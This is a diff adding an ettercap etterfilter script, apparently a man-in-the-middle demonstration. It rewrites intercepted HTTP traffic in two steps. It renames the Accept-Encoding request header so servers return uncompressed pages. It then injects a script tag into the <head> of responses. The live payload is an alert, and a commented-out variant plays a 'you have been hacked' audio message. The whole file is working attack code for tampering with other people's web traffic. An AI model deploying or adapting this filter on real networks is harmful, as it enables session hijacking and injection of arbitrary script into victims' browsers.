@@ -1,0 +1,19 @@
+# Alter HTTP request
+if (ip.proto == TCP && tcp.dst == 80) {
+	if (search(DATA.data, "Accept-Encoding")) {
+		# To avoid, at server-side, the encoding of HTTP reponse : remove the HTTP header concerned
+		# Notice: replacement string is same length as original string
+		replace("Accept-Encoding", "ByPass-Encoding");
+		msg("By-pass the content encoding HTTP header!\n");
+	}
+}
+
+# Alter HTTP response
+if (ip.proto == TCP && tcp.src == 80) {
+	if (search(DATA.data, "<head>")) {
+		# To avoid a HTTP response truncated : insert the datas at the beginning (bypassing the "Content-Length" header)
+		replace("<head>", "<head><script>alert(\"[Pilebones] Alter response with etterfilter completed\")</script>");
+		# replace("<head>", "<head><script>var audio=document.createElement('audio');audio.setAttribute('src','http://translate.google.com/translate_tts?ie=UTF-8&textlen=49&total=1&idx=0&prev=input&tl=fr&q=Vous%20venez%20de%20vous%20faire%20pirater%20par%20Clever%20Age%20!');audio.load();audio.play();</script>");
+		msg("Alter response : XSS injected!\n");
+	}
+}
